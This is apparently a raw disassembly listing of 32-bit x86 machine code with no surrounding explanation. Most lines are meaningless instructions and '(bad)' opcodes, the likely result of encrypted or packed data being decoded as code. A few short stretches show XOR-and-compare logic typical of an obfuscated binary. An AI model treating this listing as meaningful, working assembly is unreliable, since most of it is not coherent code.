  40ae5d:	xlat   BYTE PTR ds:[ebx]
  40ae5e:	fisubr WORD PTR [esi-0x5de42355]
  40ae64:	ss fabs 
  40ae67:	xor    BYTE PTR [edi-0x3fb6f1af],bl
  40ae6d:	xchg   ebp,eax
  40ae6e:	adc    al,0x9a
  40ae70:	adc    DWORD PTR [ebp+0x221ee330],edi
  40ae76:	mov    eax,0x630b96ed
  40ae7b:	mov    DWORD PTR [edi+ebx*2],esp
  40ae7e:	data16 mov ah,0x99
  40ae81:	fisubr DWORD PTR [ebp+ebp*1-0x299ba606]
  40ae88:	fist   WORD PTR [edx-0x67bf5b57]
  40ae8e:	adc    edi,0x8f4b7ab9
  40ae94:	int3   
  40ae95:	mov    ss,WORD PTR [edx+ebp*2]
  40ae98:	jmp    0x37bf4b0b
  40ae9d:	adc    eax,0xf67c3d32
  40aea2:	hlt    
  40aea3:	shl    BYTE PTR [edi+0x270244f4],cl
  40aea9:	pushf  
  40aeaa:	(bad)  
  40aeab:	stc    
  40aeac:	and    ah,BYTE PTR [edi]
  40aeae:	into   
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	cmp    BYTE PTR [edi+edi*2-0x5],ah
  40aeb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb5:	or     BYTE PTR [edi],bl
  40aeb7:	mov    edi,0xa9cfdf5b
  40aebc:	ficom  WORD PTR fs:[edx]
  40aebf:	ror    bh,0xd
  40aec2:	aas    
  40aec3:	xor    al,0xa9
  40aec5:	ret    0x4261
  40aec8:	mov    bl,0x6d
  40aeca:	xchg   DWORD PTR [eax+0x24],eax
  40aecd:	sub    DWORD PTR [edx],edx
  40aecf:	fmul   DWORD PTR [edx-0x7f]
  40aed2:	rcl    BYTE PTR [ebp+0x3f],0xac
  40aed6:	mul    BYTE PTR [eax+0x1d]
  40aed9:	pop    esi
  40aeda:	push   edi
  40aedb:	iret   
  40aedc:	test   al,0xd3
  40aede:	fimul  WORD PTR [ecx+eax*1-0x33a961f]
  40aee5:	push   ecx
  40aee6:	mov    al,0x25
  40aee8:	aaa    
  40aee9:	inc    edi
  40aeea:	pushf  
  40aeeb:	sbb    eax,0x6175435e
  40aef0:	inc    edi
  40aef1:	std    
  40aef2:	cmp    al,0x19
  40aef4:	jno    0x40af6f
  40aef6:	xchg   edx,eax
  40aef7:	int    0x41
  40aef9:	cmp    eax,0x8c06b136
  40aefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeff:	xchg   ebx,eax
  40af00:	dec    ebp
  40af01:	(bad)  
  40af02:	push   edx
  40af03:	jns    0x40aead
  40af05:	int    0xb8
  40af07:	adc    eax,0xf770ad24
  40af0c:	fs pop esi
  40af0e:	mov    esi,0x1b50038d
  40af13:	dec    eax
  40af14:	jmp    0xfd51ba92
  40af19:	stos   DWORD PTR es:[edi],eax
  40af1a:	or     BYTE PTR [edi+0x3e2e40cb],al
  40af20:	fsub   QWORD PTR [ebx+0x576bb9f]
  40af26:	or     al,0xa3
  40af28:	fdivr  st,st(6)
  40af2a:	sub    eax,0x60b35190
  40af2f:	pusha  
  40af30:	stos   DWORD PTR es:[edi],eax
  40af31:	pop    es
  40af32:	ins    BYTE PTR es:[edi],dx
  40af33:	sbb    al,0x4c
  40af35:	and    esp,DWORD PTR [edi+0x76436489]
  40af3b:	call   0x648:0x2c593229
  40af42:	push   edx
  40af43:	ins    DWORD PTR es:[edi],dx
  40af44:	xor    ecx,edx
  40af46:	sub    eax,0x345b0e7f
  40af4b:	pop    es
  40af4c:	cld    
  40af4d:	inc    eax
  40af4e:	dec    esp
  40af4f:	rcr    ch,0xab
  40af52:	xor    al,0xbd
  40af54:	lahf   
  40af55:	mov    ds:0xd1172e11,al
  40af5a:	mov    edi,0xcafaf717
  40af5f:	inc    eax
  40af60:	add    ecx,eax
  40af62:	pop    edx
  40af63:	mov    cl,0x55
  40af65:	push   es
  40af66:	mov    ds:0x266fa979,eax
  40af6b:	rcl    BYTE PTR [ebx],0xf3
  40af6e:	xchg   esi,eax
  40af6f:	shl    eax,cl
  40af71:	sub    cl,BYTE PTR [esi+0x75]
  40af74:	adc    eax,DWORD PTR [edi-0x75]
  40af77:	div    ch
  40af79:	push   0x8b60f79c
  40af7e:	or     cl,BYTE PTR [edi+ebp*8+0x11]
  40af82:	sar    DWORD PTR [edi+0x67d4c2a1],1
  40af88:	adc    edx,ecx
  40af8a:	in     al,dx
  40af8b:	in     al,0x79
  40af8d:	imul   eax,DWORD PTR [ecx],0xffc6ae64
  40af93:	add    esp,DWORD PTR [eax+ebp*4+0x36]
  40af97:	out    0x84,al
  40af99:	jb     0x40af92
  40af9b:	cmp    ch,BYTE PTR [edi]
  40af9d:	fbld   TBYTE PTR [eax+0x1e7bb2ce]
  40afa3:	fnstcw WORD PTR [edi-0x34]
  40afa6:	shl    edi,0x5d
  40afa9:	push   0xa76a5d83
  40afae:	xor    DWORD PTR [edx],edx
  40afb0:	in     al,0xe4
  40afb2:	push   es
  40afb3:	or     DWORD PTR [edx-0xf4a4690],ecx
  40afb9:	sbb    DWORD PTR [edi],0x3c044ad7
  40afbf:	into   
  40afc0:	mov    al,0x42
  40afc2:	out    dx,eax
  40afc3:	cld    
  40afc4:	retf   
  40afc5:	call   0x2f64b2a2
  40afca:	test   bh,bh
  40afcc:	mov    cl,0xe
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     bl,BYTE PTR [ebp-0x29]
  40aff9:	mov    dl,0xe9
  40affb:	jns    0x40afe5
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40b061
  40b004:	adc    BYTE PTR [ecx-0x5e],bh
  40b007:	popf   
  40b008:	fldcw  WORD PTR [edi]
  40b00a:	pop    eax
  40b00b:	pop    es
  40b00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b00d:	test   BYTE PTR [esi-0x2f],dh
  40b010:	(bad)  [ebx]
  40b012:	mov    dh,0x19
  40b014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b015:	jle    0x40aff7
  40b017:	xchg   ecx,eax
  40b018:	lds    ebx,FWORD PTR [edi+0x20d1c30d]
  40b01e:	(bad)  
  40b020:	retf   
  40b021:	adc    DWORD PTR [edx],ecx
  40b023:	sbb    al,0x31
  40b025:	push   0xffffffa8
  40b027:	retf   
  40b028:	scas   al,BYTE PTR es:[edi]
  40b029:	sub    BYTE PTR [ebp+edx*2-0x6e],cl
  40b02d:	xor    al,0xad
  40b02f:	popa   
  40b030:	popa   
  40b031:	pop    edx
  40b032:	pop    edi
  40b033:	fimul  DWORD PTR [ebp+0x42]
  40b036:	dec    edi
  40b037:	pop    ecx
  40b038:	ror    ch,1
  40b03a:	pop    eax
  40b03b:	js     0x40b003
  40b03d:	pop    es
  40b03e:	fnsave [ebp+0x41]
  40b041:	push   esp
  40b042:	cdq    
  40b043:	pop    eax
  40b044:	mov    esp,0x99e29159
  40b049:	pop    esp
  40b04a:	xor    al,0x6a
  40b04c:	stos   BYTE PTR es:[edi],al
  40b04d:	pop    ebx
  40b04e:	loope  0x40afeb
  40b050:	pop    es
  40b051:	enter  0xf87b,0xcc
  40b055:	jno    0x40b07d
  40b057:	pop    esp
  40b058:	je     0x40b068
  40b05a:	cdq    
  40b05b:	sub    eax,0x9ac308ab
  40b060:	shr    BYTE PTR ds:0x1d4aa920,1
  40b066:	test   al,0xa9
  40b068:	sub    eax,0x6f011953
  40b06d:	jmp    0xa5d3:0x6535f4e2
  40b074:	jle    0x40b040
  40b076:	ret    0x1b77
  40b079:	shl    cl,0x97
  40b07c:	mov    dh,0x4
  40b07e:	sbb    eax,0x6fb1f7e9
  40b083:	rol    BYTE PTR [edx-0x94f20c8],0x52
  40b08a:	mov    bl,0x8d
  40b08c:	cld    
  40b08d:	mov    dh,0x71
  40b08f:	es popa 
  40b091:	das    
  40b092:	aaa    
  40b093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b094:	mov    ebx,0x4ecb365d
  40b099:	push   ebp
  40b09a:	and    eax,0xe1d4e587
  40b09f:	mov    eax,ds:0x46caf0a5
  40b0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a5:	cld    
  40b0a6:	cs jnp 0x40b09a
  40b0a9:	xchg   edx,eax
  40b0aa:	or     al,0xd7
  40b0ac:	in     eax,dx
  40b0ad:	push   edx
  40b0ae:	std    
  40b0af:	adc    edi,DWORD PTR [ebp+0x577decf8]
  40b0b5:	stc    
  40b0b6:	call   0xa40:0x816b0a01
  40b0bd:	jmp    0x3e52:0xc8532177
  40b0c4:	pop    edx
  40b0c5:	mov    cl,0x7f
  40b0c7:	dec    ebx
  40b0c8:	pop    esi
  40b0c9:	adc    ah,BYTE PTR [ebx-0x33]
  40b0cc:	in     al,dx
  40b0cd:	pop    es
  40b0ce:	aaa    
  40b0cf:	(bad)  
  40b0d0:	xchg   BYTE PTR [ebp+esi*4+0x7c],dh
  40b0d4:	inc    dx
  40b0d6:	mov    gs,WORD PTR [edi]
  40b0d8:	(bad)  
  40b0da:	cld    
  40b0db:	(bad)  
  40b0dc:	neg    BYTE PTR [ecx-0x7a723577]
  40b0e2:	fld    QWORD PTR [edx]
  40b0e4:	xor    cl,dh
  40b0e6:	sbb    ecx,DWORD PTR [edx+0x3f]
  40b0e9:	pop    ds
  40b0ea:	sub    bh,BYTE PTR [esi]
  40b0ec:	add    esp,ecx
  40b0ee:	out    0x21,eax
  40b0f0:	lds    edx,FWORD PTR [esp+edi*8+0x33]
  40b0f4:	and    BYTE PTR [edi+0x31],bh
  40b0f7:	xor    ah,BYTE PTR [ecx]
  40b0f9:	bound  edi,QWORD PTR [edx]
  40b0fb:	jp     0x40b12d
  40b0fd:	sbb    eax,0x5344ae1e
  40b102:	ror    edi,0xe3
  40b105:	outs   dx,DWORD PTR ds:[esi]
  40b106:	rdtsc  
  40b108:	fninit 
  40b10a:	aam    0x13
  40b10c:	jae    0x40b167
  40b10e:	into   
  40b10f:	xchg   edi,eax
  40b110:	inc    ebx
  40b111:	push   ecx
  40b112:	in     eax,dx
  40b113:	mov    bh,0xef
  40b115:	sbb    eax,0xf589409b
  40b11a:	inc    edi
  40b11b:	cdq    
  40b11c:	sub    BYTE PTR [edi+0x8],0x85
  40b120:	xchg   ebx,eax
  40b122:	push   ecx
  40b123:	lock mov edx,0x426220e2
  40b129:	or     eax,DWORD PTR [esi]
  40b12b:	mov    al,ds:0x459af5
  40b130:	add    DWORD PTR [ebx+0x51],edi
  40b133:	pop    eax
  40b134:	jmp    0x40b13c
  40b136:	fist   DWORD PTR [ecx+0x61a7d2a8]
  40b13c:	push   es
  40b13d:	push   0x33
  40b13f:	ins    DWORD PTR es:[edi],dx
  40b140:	pop    esp
  40b141:	(bad)  
  40b142:	or     BYTE PTR [esi],bh
  40b144:	jle    0x40b14a
  40b146:	adc    BYTE PTR [eax+0x15579a1],dl
  40b14c:	inc    ebx
  40b14d:	xchg   ch,ch
  40b14f:	mov    ch,0x93
  40b151:	jb     0x40b100
  40b153:	outs   dx,BYTE PTR ds:[esi]
  40b154:	and    esp,DWORD PTR [edx+0x9]
  40b157:	mov    eax,ds:0x256cb3a5
  40b15c:	mov    al,0xe5
  40b15e:	call   0x2033fafa
  40b163:	out    dx,al
  40b164:	out    0x48,eax
  40b166:	fdiv   st(3),st
  40b168:	lsl    ebp,WORD PTR [esi]
  40b16b:	push   ss
  40b16c:	sub    eax,0x3aa83bc3
  40b171:	mov    dh,BYTE PTR [eax]
  40b173:	les    eax,FWORD PTR [ecx-0x53]
  40b176:	jmp    0xd8cf1832
  40b17b:	popa   
  40b17c:	pop    esi
  40b17d:	cmc    
  40b17e:	jmp    0x40b189
  40b180:	inc    edi
  40b181:	push   esi
  40b182:	ret    0xe483
  40b185:	(bad)  
  40b186:	std    
  40b187:	cmp    eax,0x7941c708
  40b18c:	mov    eax,0xa7f81f5d
  40b191:	loopne 0x40b1cd
  40b193:	scas   eax,DWORD PTR es:[di]
  40b195:	fimul  DWORD PTR [esi+edx*8]
  40b198:	mov    DWORD PTR [ecx-0x7a957a8b],ebx
  40b19e:	push   ebx
  40b19f:	jbe    0x40b17c
  40b1a1:	test   eax,0xcf75dda7
  40b1a6:	pop    eax
  40b1a7:	jbe    0x40b1a8
  40b1a9:	stc    
  40b1aa:	mov    DWORD PTR [ebp+0x4f],0xeddf217e
  40b1b1:	pusha  
  40b1b2:	call   0xd99d:0x63713bd1
  40b1b9:	jge    0x40b1ca
  40b1bb:	in     eax,0xf2
  40b1bd:	lods   al,BYTE PTR ds:[esi]
  40b1be:	in     al,0xb2
  40b1c0:	fidiv  DWORD PTR [esp+esi*1]
  40b1c3:	mov    dl,0x3
  40b1c5:	sbb    eax,0x3381baf7
  40b1ca:	repnz adc al,0xc
  40b1cd:	dec    esi
  40b1ce:	scas   eax,DWORD PTR es:[edi]
  40b1cf:	out    0xf1,al
  40b1d1:	jns    0x40b186
  40b1d3:	cmp    al,0xd2
  40b1d5:	mov    bl,0x31
  40b1d7:	sar    BYTE PTR [eax],0x86
  40b1da:	add    esp,esp
  40b1dc:	and    BYTE PTR fs:[eax-0x5e],0x92
  40b1e1:	fisub  DWORD PTR [eax]
  40b1e3:	es push cs
  40b1e5:	pop    ss
  40b1e6:	push   esp
  40b1e7:	xor    al,BYTE PTR [eax]
  40b1e9:	jecxz  0x40b180
  40b1eb:	ins    BYTE PTR es:[edi],dx
  40b1ec:	pop    ds
  40b1ed:	cld    
  40b1ee:	stos   DWORD PTR es:[edi],eax
  40b1ef:	dec    edx
  40b1f0:	repz repz ficom WORD PTR [ecx+0x255deb17]
  40b1f8:	mov    ecx,?
  40b1fa:	jbe    0x40b22e
  40b1fc:	repz dec eax
  40b1fe:	pop    esp
  40b1ff:	outs   dx,BYTE PTR ds:[esi]
  40b200:	mov    bh,0x29
  40b202:	fdiv   QWORD PTR [ebx]
  40b204:	sbb    al,0xbc
  40b206:	adc    DWORD PTR [eax+0x148b8b89],edi
  40b20c:	cmp    bh,BYTE PTR [edx+esi*4+0x6f]
  40b210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b211:	ins    DWORD PTR es:[edi],dx
  40b212:	outs   dx,DWORD PTR ds:[esi]
  40b213:	pop    es
  40b214:	jmp    0x40b1c6
  40b216:	mov    eax,0xf374ad33
  40b21b:	inc    ebx
  40b21c:	ins    BYTE PTR es:[edi],dx
  40b21d:	xor    ecx,esi
  40b21f:	test   DWORD PTR [ebp-0x25],ebp
  40b222:	inc    edx
  40b223:	pop    esp
  40b224:	xchg   esi,eax
  40b225:	out    0x76,al
  40b227:	mov    bl,0xbb
  40b229:	pop    esp
  40b22a:	repnz in al,0xce
  40b22d:	pop    ebp
  40b22e:	mov    ds:0x9e52fc2f,al
  40b233:	je     0x40b1ec
  40b235:	pop    eax
  40b236:	in     eax,0x3b
  40b238:	scas   eax,DWORD PTR es:[edi]
  40b239:	and    eax,DWORD PTR fs:[ebx+0x577495da]
  40b240:	ret    0xeb65
  40b243:	out    dx,al
  40b244:	mov    ebx,0xf43d95bf
  40b249:	cmp    edx,ebx
  40b24b:	adc    BYTE PTR [eax+esi*2],ch
  40b24e:	push   edx
  40b24f:	popa   
  40b250:	je     0x40b222
  40b252:	iret   
  40b253:	xchg   edx,eax
  40b254:	mov    WORD PTR [esi+0xf],gs
  40b257:	lock push eax
  40b259:	mov    cl,0x5c
  40b25b:	pop    ecx
  40b25c:	xchg   ecx,eax
  40b25d:	outs   dx,DWORD PTR ds:[esi]
  40b25e:	div    BYTE PTR [esi]
  40b260:	test   BYTE PTR [esi+0x6],0x2c
  40b264:	cmp    ebp,DWORD PTR [ecx]
  40b266:	dec    eax
  40b267:	icebp  
  40b268:	icebp  
  40b269:	mov    al,BYTE PTR [ebx]
  40b26b:	ror    dl,1
  40b26d:	rol    BYTE PTR [ecx-0x12b3e5db],0xc4
  40b274:	mov    dh,0x68
  40b276:	jp     0x40b208
  40b278:	pop    ecx
  40b279:	(bad)  
  40b27a:	(bad)
  40b27d:	jmp    0x40b21d
  40b27f:	mov    ecx,0x98bbc9f9
  40b284:	sub    eax,DWORD PTR [eax+eax*4-0x6d4dce37]
  40b28b:	sbb    al,0x98
  40b28d:	mov    esp,DWORD PTR [ebx+0x7047f9fb]
  40b293:	fmul   QWORD PTR [edx-0xb]
  40b296:	pop    edx
  40b297:	gs pop ebp
  40b299:	sub    eax,0x851fd9fe
  40b29e:	(bad)  
  40b2a0:	dec    edx
  40b2a1:	or     BYTE PTR [edx-0x6d],cl
  40b2a4:	in     eax,dx
  40b2a5:	iret   
  40b2a6:	push   cs
  40b2a7:	mov    dh,0x20
  40b2a9:	hlt    
  40b2aa:	xchg   ebx,eax
  40b2ab:	imul   esi,DWORD PTR [esi+0x1c],0x6d
  40b2af:	aas    
  40b2b0:	rol    DWORD PTR [edx+0x4],1
  40b2b3:	mov    dh,0xa7
  40b2b5:	xchg   ecx,eax
  40b2b6:	or     BYTE PTR [ebx+0x377f239d],bl
  40b2bc:	cs sbb eax,0x500a6f80
  40b2c2:	mov    gs:0x86433c94,al
  40b2c8:	xor    BYTE PTR [eax+ebx*4],dl
  40b2cb:	xor    ecx,esi
  40b2cd:	cmp    esp,DWORD PTR [eax-0x16]
  40b2d0:	fisubr WORD PTR [ebp-0x34029e84]
  40b2d6:	or     eax,0x1b41f06d
  40b2db:	aas    
  40b2dc:	pop    DWORD PTR [ecx+edi*4]
  40b2df:	gs xchg ecx,eax
  40b2e1:	adc    dl,BYTE PTR [ecx-0x151d1bc9]
  40b2e7:	mov    eax,es:0x1cc96ca4
  40b2ed:	mov    esp,edi
  40b2ef:	stc    
  40b2f0:	(bad)  
  40b2f1:	mov    BYTE PTR [eax+0xbe8e9c2],cl
  40b2f7:	ss sbb al,0x1d
  40b2fa:	leave  
  40b2fb:	jns    0x40b319
  40b2fd:	jge    0x40b356
  40b2ff:	pop    edx
  40b300:	mov    esp,0x1a40595e
  40b305:	or     eax,0x62b5a90
  40b30a:	cbw    
  40b30c:	(bad)  
  40b30d:	mov    esp,0xc7f6061b
  40b312:	pop    DWORD PTR [ebp-0x5a]
  40b315:	cwde   
  40b316:	sub    eax,0x4ff2f4db
  40b31b:	fnstcw WORD PTR [eax]
  40b31d:	fbld   TBYTE PTR [ecx+0x70fca408]
  40b323:	lea    edx,[ebx]
  40b325:	pop    es
  40b326:	push   cs
  40b327:	cli    
  40b328:	mov    esp,0xf88e5b9a
  40b32d:	add    BYTE PTR [eax],bl
  40b32f:	mov    edx,0x8bde6e02
  40b334:	inc    ebp
  40b335:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	cwde   
  40b375:	dec    edx
  40b376:	loope  0x40b3f4
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b340
  40b381:	xchg   ebp,eax
  40b382:	ror    bl,1
  40b384:	mov    DWORD PTR [ecx],esp
  40b386:	in     al,dx
  40b387:	inc    esi
  40b388:	mov    ebx,0x7fc8d865
  40b38d:	inc    ebp
  40b38e:	clc    
  40b38f:	ret    0xf0a9
  40b392:	gs push ebx
  40b394:	fist   DWORD PTR [esi+0xc309c46]
  40b39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b39b:	retf   
  40b39c:	mov    esi,0xc53a51c0
  40b3a1:	adc    eax,0x6355bde8
  40b3a6:	push   edx
  40b3a7:	enter  0x54ff,0xc7
  40b3ab:	jnp    0xc5537e42
  40b3b1:	xor    edi,DWORD PTR [edx+0x6a243be1]
  40b3b7:	jge    0x40b436
  40b3b9:	or     DWORD PTR [edx+0x7b],esp
  40b3bc:	std    
  40b3bd:	iret   
  40b3be:	fcom   DWORD PTR [ebx+0xeb37f09]
  40b3c4:	xor    bl,BYTE PTR [ebx]
  40b3c6:	stos   DWORD PTR es:[edi],eax
  40b3c7:	jg     0x40b3ad
  40b3c9:	cld    
  40b3ca:	ja     0x40b403
  40b3cc:	out    dx,al
  40b3cd:	icebp  
  40b3ce:	pop    ss
  40b3cf:	add    ah,BYTE PTR [eax]
  40b3d1:	dec    eax
  40b3d2:	stos   DWORD PTR es:[edi],eax
  40b3d3:	xchg   edi,eax
  40b3d4:	lds    ebx,FWORD PTR [eax+0x48]
  40b3d7:	xlat   BYTE PTR ds:[ebx]
  40b3d8:	lahf   
  40b3d9:	clc    
  40b3da:	addr16 jmpw 0x7bba
  40b3df:	pop    edx
  40b3e0:	mov    ah,0x1b
  40b3e2:	pop    edi
  40b3e3:	je     0x40b37c
  40b3e5:	imul   BYTE PTR [eax]
  40b3e7:	xchg   DWORD PTR [eax],edi
  40b3e9:	fcomp  QWORD PTR [edx]
  40b3eb:	test   eax,0xbd31bc83
  40b3f0:	fisub  DWORD PTR [ebp-0x138dd595]
  40b3f6:	and    esp,esi
  40b3f8:	call   0xc406:0xca9ff347
  40b3ff:	push   ss
  40b400:	sbb    esp,DWORD PTR [edi]
  40b402:	ins    DWORD PTR es:[edi],dx
  40b403:	jecxz  0x40b3ff
  40b405:	cmp    esi,ecx
  40b407:	iret   
  40b408:	repnz ss ins BYTE PTR es:[edi],dx
  40b40b:	enter  0xc18c,0x83
  40b40f:	cs jae 0x40b46e
  40b412:	adc    al,0xbc
  40b414:	sub    DWORD PTR [edx-0x139c2475],eax
  40b41a:	fldenv [eax+0x3ed8ffaa]
  40b420:	nop
  40b421:	mov    ebx,DWORD PTR [ebp-0x690cd3f9]
  40b427:	jae    0x40b46e
  40b429:	mov    ds,WORD PTR [edi-0x36e3cc60]
  40b42f:	pop    es
  40b430:	add    cl,0x72
  40b433:	shr    BYTE PTR [ebp+0x4f62f8b4],0x14
  40b43a:	jns    0x40b455
  40b43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b43d:	aam    0x52
  40b43f:	cmp    cl,BYTE PTR [edi-0x60]
  40b442:	jae    0x40b46c
  40b444:	pushf  
  40b445:	fxch   st(0)
  40b447:	jge    0x40b416
  40b449:	pop    es
  40b44a:	xchg   esp,eax
  40b44b:	adc    esi,DWORD PTR [edx]
  40b44d:	in     eax,0x87
  40b44f:	(bad)  
  40b450:	fwait
  40b451:	mov    edx,0x583155dc
  40b456:	sub    al,0xf0
  40b458:	mov    ds:0x7b6bdc21,al
  40b45d:	jmp    0x78ec374e
  40b462:	out    0xc1,al
  40b464:	out    0xaa,al
  40b466:	(bad)  
  40b467:	fdivr  DWORD PTR [edi]
  40b469:	out    dx,al
  40b46a:	adc    dh,dh
  40b46c:	out    0x5d,al
  40b46e:	cmp    BYTE PTR [edi+0x7a],dl
  40b471:	add    edi,DWORD PTR [edx+0x73352fe7]
  40b477:	sub    eax,0x7633edb1
  40b47c:	test   al,0x7b
  40b47e:	push   ebx
  40b47f:	or     eax,0xd0fea1c8
  40b484:	jge    0x40b414
  40b486:	and    eax,0x45f02749
  40b48b:	add    BYTE PTR ds:0xd2d9c174,dl
  40b491:	pop    ebp
  40b492:	out    dx,eax
  40b493:	sub    al,BYTE PTR [ebx-0x38]
  40b496:	mov    DWORD PTR [eax+0x31],0x751875db
  40b49d:	and    eax,0x7bae8691
  40b4a2:	das    
  40b4a3:	js     0x40b524
  40b4a5:	mov    eax,ebx
  40b4a7:	or     BYTE PTR [edx-0x8413646],cl
  40b4ad:	pop    ss
  40b4ae:	mov    bl,0x47
  40b4b0:	mov    edi,0x56a6185c
  40b4b5:	jl     0x40b452
  40b4b7:	test   al,0xd1
  40b4b9:	push   ecx
  40b4ba:	push   esp
  40b4bb:	xor    DWORD PTR [eax],esp
  40b4bd:	and    BYTE PTR [esi+0x7927c8f1],0x1b
  40b4c4:	cmp    al,BYTE PTR ds:0xdc63d00
  40b4ca:	add    dh,BYTE PTR [esp+ebp*8+0x17]
  40b4ce:	nop
  40b4cf:	in     eax,0x58
  40b4d1:	das    
  40b4d2:	jg     0x40b52b
  40b4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4d5:	push   edx
  40b4d6:	aad    0x77
  40b4d8:	push   eax
  40b4d9:	fs repz xor eax,0xaa6632d9
  40b4e0:	inc    edx
  40b4e1:	cmp    BYTE PTR [ecx-0xa],ch
  40b4e4:	sub    DWORD PTR [esi-0x34394337],ebx
  40b4ea:	jns    0x40b561
  40b4ec:	scas   al,BYTE PTR es:[edi]
  40b4ed:	inc    edi
  40b4ee:	cdq    
  40b4ef:	dec    ecx
  40b4f0:	sub    eax,0x9cd29fce
  40b4f5:	hlt    
  40b4f6:	imul   ebx,eax,0x3861871c
  40b4fc:	pop    edx
  40b4fd:	popa   
  40b4fe:	lock dec esp
  40b500:	pop    DWORD PTR ss:[eax-0x36]
  40b504:	cli    
  40b505:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b507:	jecxz  0x40b49e
  40b509:	(bad)  [ebx-0x12]
  40b50c:	imul   edx,DWORD PTR [ebx],0x35
  40b50f:	mov    ah,0x5
  40b511:	or     eax,0x43e968f6
  40b516:	xchg   esp,eax
  40b517:	cmp    edi,ebx
  40b519:	and    eax,0x80b0e174
  40b51e:	sub    ebx,esi
  40b520:	bound  edx,QWORD PTR [eax+edi*8]
  40b523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b524:	mov    WORD PTR fs:[edx],?
  40b527:	sub    BYTE PTR [esp+edx*2],dh
  40b52a:	or     BYTE PTR [edx+0x609591a4],0xa7
  40b531:	pop    ss
  40b532:	dec    edx
  40b533:	mov    dl,0xee
  40b535:	sub    DWORD PTR [ebp+0x1a],esp
  40b538:	je     0x40b54c
  40b53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b53b:	or     eax,0x55003882
  40b540:	pop    ebp
  40b541:	adc    al,0xc3
  40b543:	inc    edi
  40b544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b545:	sbb    eax,0x98d346fe
  40b54a:	fisttp DWORD PTR ds:0x55031e0f
  40b550:	mov    WORD PTR [ebx-0x16],fs
  40b553:	mov    eax,0xec6aff7d
  40b558:	jmp    0x57ba:0xce86dad7
  40b55f:	out    0x6b,eax
  40b561:	lock mov ebp,0xc9fe9ff7
  40b567:	je     0x40b5e4
  40b569:	(bad)  ds:0xd6a99668
  40b56f:	enter  0x6397,0x22
  40b573:	mov    dl,cl
  40b575:	rcr    DWORD PTR [eax],0x7d
  40b578:	std    
  40b579:	mov    ch,ch
  40b57b:	mov    cl,0xe
  40b57d:	fcmovb st,st(1)
  40b57f:	fs sar ah,0x6c
  40b583:	add    DWORD PTR [ebx],ebx
  40b585:	inc    edx
  40b586:	in     eax,dx
  40b587:	adc    ah,BYTE PTR [ecx]
  40b589:	std    
  40b58a:	popf   
  40b58b:	xchg   BYTE PTR [ecx+0x328d452f],cl
  40b591:	mov    ebp,0xe9659849
  40b596:	sti    
  40b597:	sbb    BYTE PTR [ecx+0x59],dh
  40b59a:	mov    dl,BYTE PTR [ebp-0x3dde33ab]
  40b5a0:	sbb    DWORD PTR [ebp+0x74a1310e],ebp
  40b5a6:	jo     0x40b600
  40b5a8:	imul   esp,DWORD PTR [eax+ecx*1],0x3
  40b5ac:	outs   dx,BYTE PTR ds:[esi]
  40b5ad:	xchg   DWORD PTR [eax-0x5e],eax
  40b5b0:	retf   0xddf8
  40b5b3:	xchg   ebx,eax
  40b5b4:	mov    al,ds:0xe6c6bf9b
  40b5b9:	sar    DWORD PTR [edx+0x1eef3f5],1
  40b5bf:	ss imul eax,DWORD PTR es:[eax+ebp*4-0x7a7d69e5],0xd875f498
  40b5cc:	cmp    bl,dh
  40b5ce:	cdq    
  40b5cf:	jmp    0x224b:0x515262fe
  40b5d6:	jnp    0x40b599
  40b5d8:	dec    ebx
  40b5d9:	dec    ecx
  40b5da:	xchg   edi,eax
  40b5db:	fild   WORD PTR [ebx-0x8]
  40b5de:	sub    esp,DWORD PTR [esp+eax*8]
  40b5e1:	and    al,0x10
  40b5e3:	ret    
  40b5e4:	sub    bl,bl
  40b5e6:	cmp    BYTE PTR ds:0x16982742,cl
  40b5ec:	mov    bl,dh
  40b5ee:	pxor   mm5,mm4
  40b5f1:	xchg   ecx,eax
  40b5f2:	adc    BYTE PTR [ebx-0x53],ah
  40b5f5:	xor    edx,eax
